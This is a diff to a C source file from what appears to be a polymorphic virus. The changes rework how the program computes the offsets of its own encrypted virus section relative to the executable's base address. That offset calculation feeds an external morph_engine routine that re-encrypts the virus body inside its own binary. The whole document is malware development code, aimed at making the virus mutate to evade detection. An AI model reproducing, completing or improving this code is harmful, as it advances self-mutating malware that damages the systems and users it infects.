@@ -5,6 +5,9 @@
 #include <string.h>
 #include <unistd.h>
 
+/* WARNING: Ensure this is updated on every compilation | Defines hex offset of main function */
+#define _main_ "0x1240"
+
 char *filename;
 
 extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
@@ -24,40 +27,15 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	// seed the random number generator
 	srand(time(NULL));
 
+	// unsigned long main_int =  4656;
+	unsigned long main_int =  (int)strtol(_main_, NULL, 16);
+	// get base address of executable
+	unsigned long base_addr = virus_instruction_begin - main_int;
 
-
-
-	unsigned long full_addr_enc_begin = virus_instruction_begin;
-
-	// to get offset just delete the most significant char
-	char buffer1[15];
-	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
-	char *main_offset = buffer1;
-	// write(1, main_offset, strlen(main_offset));
-	main_offset = main_offset + 1;
-	// write(1, main_offset, strlen(main_offset));
-	printf("\n");
-
-	char buffer3[15];
-	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
-	char *decryption_offset = buffer3;
-	decryption_offset = decryption_offset + 1;
-	// write(1, decryption_offset, strlen(decryption_offset));
-
-	// printf("\n");
-
-
-      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
-	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
-
-      printf("%ul\n", virus_instruction_begin);
-      printf("%ul\n", virus_decrypt_offset);
-
-
-	// /* Append these values from manual input via objdump*/
-	// virus_instruction_begin = 4656;
-	// virus_encrypt_size = 2608;
-	// virus_decrypt_offset = 7502;
+	// calculate offset of virus_instruction_begin in relative to base address of executable
+	virus_instruction_begin = virus_instruction_begin - base_addr;
+	// calculate offset of virus_decrypt_offset in relative to base address of executable
+	virus_decrypt_offset = virus_decrypt_offset - base_addr;
 
 
 	FILE *f = fopen(filename, "rb");
